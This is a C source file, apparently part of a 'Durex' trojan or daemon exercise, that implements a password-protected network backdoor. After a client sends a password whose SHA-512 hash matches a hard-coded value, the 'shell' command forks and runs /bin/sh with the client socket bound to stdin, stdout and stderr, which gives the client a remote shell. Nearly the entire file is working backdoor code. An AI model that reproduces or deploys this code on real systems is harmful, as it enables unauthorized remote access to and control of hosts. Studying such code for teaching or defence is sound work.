#include "durex.h"

const uint32_t hashed_passwd[16] = {
	0x4f5aa3f3,
	0x5a25d0c3,
	0x09d8420d,
	0x56fa998b,
	0xacaa46b3,
	0x42296990,
	0x6b014a42,
	0x2c262597,
	0x3bbfa635,
	0x6178407f,
	0x40f3fb78,
	0x241229cf,
	0x9ec0741e,
	0xa5264289,
	0xd2019bd4,
	0x262c04c3
};


static void	disconnect_user(t_client_data *client)
{
	close(client->fd);
	client->fd = -1;
	client->is_logged = 0;
	ft_bzero(&client->read_buffer, CLIENT_BUFFER_SIZE);
	ft_bzero(&client->write_buffer, CLIENT_BUFFER_SIZE);
	client->wbuffer_pos = 0;
	client->rbuffer_pos = 0;
}

static void	client_fill_buffer(t_client_data *client, char *msg, size_t len)
{
	if (client->wbuffer_pos + len > CLIENT_BUFFER_SIZE - 1)
	{
		send(client->fd, client->write_buffer, client->wbuffer_pos, 0);
		ft_strncpy(client->write_buffer, msg, len);
		client->wbuffer_pos = len;
	}
	else
	{
		ft_strncpy(client->write_buffer + client->wbuffer_pos, msg, len);
		client->wbuffer_pos += len;
	}
}

static void	spawn_shell(t_client_data *client)
{
	pid_t	pid;
	char	*av[] = {NULL};

	pid = fork();
	if (pid == -1)
	{
		client_fill_buffer(client, SHELL_FAILED_MESSAGE, sizeof(SHELL_FAILED_MESSAGE) - 1);
		return ;
	}
	if (pid == 0)
	{
		dup2(client->fd, 2);
		dup2(client->fd, 1);
		dup2(client->fd, 0);
		execve("/bin/sh", av, av);
		exit(0);
	}
	else
		disconnect_user(client);
}

static void	handle_message(t_client_data *client)
{
	uint32_t	passwd_hash[16];
	char		passwd_str[16 * 8 + 1];

	if (client->is_logged == 0)
	{
		sha512(passwd_hash, client->read_buffer, client->rbuffer_pos * 8);
		for (size_t i = 0; i < 16; i++)
			sprintf(passwd_str + i * 8, "%08x", passwd_hash[i]);
		passwd_str[16 * 8] = 0;
		//dprintf(client->fd, "%s", passwd_str);
		if (strcmp(passwd_str, PASSWD_STR))
		{
			send(client->fd, WRONG_PASSWORD, sizeof(WRONG_PASSWORD) - 1, 0);
			disconnect_user(client);
			return ;
		}
		client->is_logged = 1;
		client_fill_buffer(client, WELCOME_MESSAGE, sizeof(WELCOME_MESSAGE) - 1);
	}
	else
	{
		if (!strcmp(client->read_buffer, "help"))
			client_fill_buffer(client, HELP_MESSAGE, sizeof(HELP_MESSAGE) - 1);
		else if (!strcmp(client->read_buffer, "exit"))
		{
			disconnect_user(client);
			return ;
		}
		else if (!strcmp(client->read_buffer, "shell"))
			spawn_shell(client);
		else
			client_fill_buffer(client, UNKNOWN_COMMAND, sizeof(UNKNOWN_COMMAND) - 1);
	}
	client_fill_buffer(client, COMMAND_PROMPT, sizeof(COMMAND_PROMPT) - 1);
}

void		client_read(t_server_data *data, size_t client_id)
{
	ssize_t			ret;
	t_client_data	*client;

	client = &data->clients[client_id];
	ret = recv(client->fd, client->read_buffer + client->rbuffer_pos,
			CLIENT_BUFFER_SIZE - client->rbuffer_pos - 1, 0);
	if (ret <= 0)
	{
		disconnect_user(client);
		return ;
	}
	client->rbuffer_pos += (size_t)ret;
	if (*(client->read_buffer + client->rbuffer_pos - 1) == '\n')
	{
		*(client->read_buffer + client->rbuffer_pos - 1) = '\0';
		handle_message(client);
		client->rbuffer_pos = 0;
	}
	else if (client->rbuffer_pos == CLIENT_BUFFER_SIZE - 1)
	{
		client_fill_buffer(client, COMMAND_TOO_LONG, sizeof(COMMAND_TOO_LONG) - 1);
		client->rbuffer_pos = 0;
	}
}